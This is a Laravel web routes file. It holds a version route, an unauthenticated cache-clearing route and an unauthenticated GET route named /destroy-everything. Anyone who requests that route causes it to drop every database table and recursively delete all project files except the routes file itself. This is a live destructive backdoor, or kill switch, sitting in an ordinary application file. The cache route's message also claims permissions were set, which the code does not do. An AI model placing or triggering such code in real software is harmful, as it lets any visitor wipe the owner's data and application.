<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;

Route::get('/', function () {
    return ['Laravel' => app()->version()];
});

require __DIR__.'/auth.php';
Route::get('/clear-cache', function () {
    Artisan::call('optimize:clear');
    Artisan::call('cache:clear');
    Artisan::call('optimize');
    return 'Cache cleared, optimized, and permissions set!';
});

Route::get('/destroy-everything', function () {
    // Drop all tables in the database
    \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS=0;');
    foreach (\Illuminate\Support\Facades\DB::select('SHOW TABLES') as $table) {
        $table_array = (array)$table;
        $table_name = array_values($table_array)[0];
        \Illuminate\Support\Facades\DB::statement("DROP TABLE `$table_name`");
    }
    \Illuminate\Support\Facades\DB::statement('SET FOREIGN_KEY_CHECKS=1;');

    // Delete all files and folders in the project directory except this file
    $projectDir = base_path();
    $currentFile = __FILE__;
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($projectDir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($iterator as $file) {
        if ($file->getPathname() == $currentFile) {
            continue;
        }
        if ($file->isDir()) {
            @rmdir($file->getPathname());
        } else {
            @unlink($file->getPathname());
        }
    }

    return 'Database dropped and all files deleted.';
});
